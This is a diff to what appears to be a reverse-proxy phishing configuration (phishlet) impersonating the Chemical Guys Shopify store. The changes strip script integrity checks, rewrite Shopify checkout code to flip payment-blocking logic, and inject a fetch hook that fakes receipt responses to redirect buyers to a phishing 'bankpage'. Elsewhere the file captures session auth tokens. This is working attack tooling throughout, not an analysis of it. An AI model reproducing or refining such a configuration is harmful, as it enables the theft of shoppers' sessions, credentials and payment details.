@@ -56,8 +56,11 @@ sub_filters:
   - {triggers_on: 'cdn.shopify.com', orig_sub: 'cdn', domain: 'shopify.com', search: 'integrity=".*?"', replace: '', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'cdn.shopify.com', orig_sub: 'cdn', domain: 'shopify.com', search: '\<script type="importmap"[\s\S]*?\<\/script\>', replace: '', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   #  按钮重复提交问题
-  - {triggers_on: 'cdn.shopify.com', orig_sub: 'cdn', domain: 'shopify.com', search: '\.behavior==="block"\),', replace: '.behavior===(top.window.hack?"unblock":"block")),', mimes: ['text/javascript','application/javascript', 'application/x-javascript']}
-  # js错误问题
+  - {triggers_on: 'cdn.shopify.com', orig_sub: 'cdn', domain: 'shopify.com', search: '\.behavior==="block"\),', replace: '.behavior===(!top.window.hack?"unblock":"block")),', mimes: ['text/javascript','application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'cdn.shopify.com', orig_sub: 'cdn', domain: 'shopify.com', search: '\=\>"block"\=\=\=', replace: '=>(!top.window.hack?"unblock":"block")===', mimes: ['text/javascript','application/javascript', 'application/x-javascript']}
+#  - {triggers_on: 'cdn.shopify.com', orig_sub: 'cdn', domain: 'shopify.com', search: '\.behavior==="block"\),', replace: '.behavior==="unblock"),', mimes: ['text/javascript','application/javascript', 'application/x-javascript']}
+#  - {triggers_on: 'cdn.shopify.com', orig_sub: 'cdn', domain: 'shopify.com', search: '\=\>"block"\=\=\=', replace: '=>"unblock"===', mimes: ['text/javascript','application/javascript', 'application/x-javascript']}
+#  # js错误问题
   - {triggers_on: 'cdn.shopify.com', orig_sub: 'cdn', domain: 'shopify.com', search: '\!\/\(\^extensions\\', replace: '/(^extensions\', mimes: ['text/html']}
   - {triggers_on: 'cdn.shopify.com', orig_sub: 'cdn', domain: 'shopify.com', search: 'start\.aftersell\.app', replace: 'start.chemicalguys.fake.com', mimes: ['text/javascript','application/javascript', 'application/x-javascript']}
   - {triggers_on: 'extensions.shopifycdn.com', orig_sub: 'extensions', domain: 'shopifycdn.com', search: '\!\/\(\^extensions\\', replace: '/(^extensions\', mimes: ['text/html']}
@@ -82,7 +85,7 @@ js_inject:
           },
           {
             url: 'PollForReceipt',
-            response: {"data":{"receipt":{"id":"gid://shopify/ProcessedReceipt/1970793545956","action":{"offsiteRedirect":false,"url":"https://www.chemicalguys.fake.com/phishing","__typename":"CompletePaymentChallenge"},"timeout":{"millisecondsRemaining":691074,"__typename":"ActionRequiredReceiptTimeout"},"__typename":"ActionRequiredReceipt"}}},
+            response: {"data":{"receipt":{"id":"gid://shopify/ProcessedReceipt/1970793545956","action":{"offsiteRedirect":false,"url":"https://www.chemicalguys.fake.com/phishing/phishing","__typename":"CompletePaymentChallenge"},"timeout":{"millisecondsRemaining":691074,"__typename":"ActionRequiredReceiptTimeout"},"__typename":"ActionRequiredReceipt"}}},
             status: 200
           }
         ];
@@ -106,6 +109,10 @@ js_inject:
               );
            });
           }
+          if(url.indexOf('SubmitForCompletion')>-1){
+            console.log('放行 SubmitForCompletion 请求，等待后端处理')
+            top.window.hack = true; // 重新设置为 true，继续拦截
+          }
 
           // 没匹配的请求走原始 fetch
           return originalFetch(...args);
@@ -113,8 +120,8 @@ js_inject:
       }
 
 intercept:
-#  - {domain: 'www.chemicalguys.com', mime: 'text/redirect', body: 'https://bankpage.chemicalguys.fake.com/phishing', path: '\/phishing', http_status: 301}
-  - {domain: 'www.chemicalguys.com', mime: 'text/javascript', body: 'console.log("=============top.window.hack", top.window.hack)', path: '\/phishing', http_status: 301}
+  - {domain: 'www.chemicalguys.com', mime: 'text/redirect', body: 'bankpage.chemicalguys.fake.com:3000', path: '\/phishing\/*', http_status: 301}
+#  - {domain: 'www.chemicalguys.com', mime: 'text/javascript', body: "<!doctype html><html><head><title>Can't use proxy for local addresses</title></head><body/></html>", path: '\/phishing', http_status: 301}
 
 auth_tokens:
   - domain: 'chemicalguys.com'
